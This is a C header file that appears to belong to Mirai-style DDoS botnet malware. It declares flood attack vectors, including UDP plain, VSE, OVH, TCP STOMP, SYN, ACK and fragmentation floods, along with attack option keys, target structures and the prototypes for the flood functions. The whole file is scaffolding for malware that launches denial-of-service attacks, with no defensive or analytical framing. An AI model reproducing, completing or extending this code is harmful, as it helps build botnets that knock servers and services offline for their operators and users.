#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   1000
#define HTTP_CONNECTION_MAX     500
struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
#define ATK_VEC_UDP_PLAIN  0
#define ATK_VEC_STD        1
#define ATK_VEC_TCP        2
#define ATK_VEC_ACK        3
#define ATK_VEC_VSE        4
#define ATK_VEC_OVH        5
#define ATK_VEC_STOMP      6
#define ATK_VEC_SYN        7
#define ATK_VEC_TCPFRAG    8

#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_DNS_HDR_ID      9
#define ATK_OPT_URG             11
#define ATK_OPT_ACK             12
#define ATK_OPT_PSH             13
#define ATK_OPT_RST             14
#define ATK_OPT_SYN             15
#define ATK_OPT_FIN             16
#define ATK_OPT_SEQRND          17
#define ATK_OPT_ACKRND          18
#define ATK_OPT_GRE_CONSTIP     19
#define ATK_OPT_METHOD          20
#define ATK_OPT_POST_DATA       21
#define ATK_OPT_PATH            22
#define ATK_OPT_HTTPS           23
#define ATK_OPT_CONNS           24
#define ATK_OPT_SOURCE          25
#define ATK_OPT_MIN_SIZE        26 
#define ATK_OPT_MAX_SIZE        27
#define ATK_OPT_PAYLOAD_ONE     28
#define ATK_OPT_PAYLOAD_REPEAT  29

struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};


BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
/*UDP Methods*/
void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_ovhhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);   
/*TCP Methods*/
void attack_method_tcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpstomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
